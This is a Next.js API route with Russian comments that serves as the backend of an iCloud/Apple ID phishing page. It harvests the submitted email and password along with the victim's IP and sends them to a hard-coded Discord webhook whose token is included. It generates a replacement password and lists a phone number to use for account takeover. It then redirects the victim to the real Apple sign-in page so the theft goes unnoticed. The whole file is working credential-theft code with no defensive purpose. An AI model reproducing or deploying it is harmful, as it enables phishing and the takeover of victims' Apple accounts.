// Это файл pages/api/login.js (бэкенд, который будет принимать данные с формы)

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Метод не разрешен' });
  }

  const { username, password } = req.body;

  // Твой вебхук Discord
  const webhookUrl = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

  // Генерируем новый пароль по твоей схеме: 3 цифры + 5 букв + символ
  const randomPassword = generateRandomPassword();

  const dataToSend = {
    content: '@here **Новый аккаунт iCloud упал!**',
    embeds: [
      {
        title: '🔓 Логи iCloud',
        color: 16711680,
        fields: [
          { name: 'Почта', value: username, inline: true },
          { name: 'Пароль', value: password, inline: true },
          { name: 'Новый пароль (сгенерирован)', value: randomPassword, inline: false },
          { name: 'Номер для смены', value: '+7 771 574 70 64 (Казахстан)', inline: false },
          { name: 'IP жертвы', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: true }
        ],
        footer: { text: 'Самолет упал, но мы выжили' },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    // Отправляем в Discord
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dataToSend)
    });

    // Перенаправляем на реальный сайт Apple, чтобы жертва думала, что ошиблась паролем
    res.redirect(302, 'https://appleid.apple.com/sign-in');
  } catch (error) {
    // Если дискорд упал, все равно отправляем на Apple
    res.redirect(302, 'https://appleid.apple.com/sign-in');
  }
}

// Функция для генерации рандомного пароля
function generateRandomPassword() {
  const digits = Math.floor(100 + Math.random() * 900).toString(); // 3 цифры
  const letters = Array.from({ length: 5 }, () => 
    String.fromCharCode(97 + Math.floor(Math.random() * 26))
  ).join(''); // 5 букв
  const symbols = '!@#$%&*';
  const symbol = symbols[Math.floor(Math.random() * symbols.length)];
  
  return digits + letters + symbol;
}
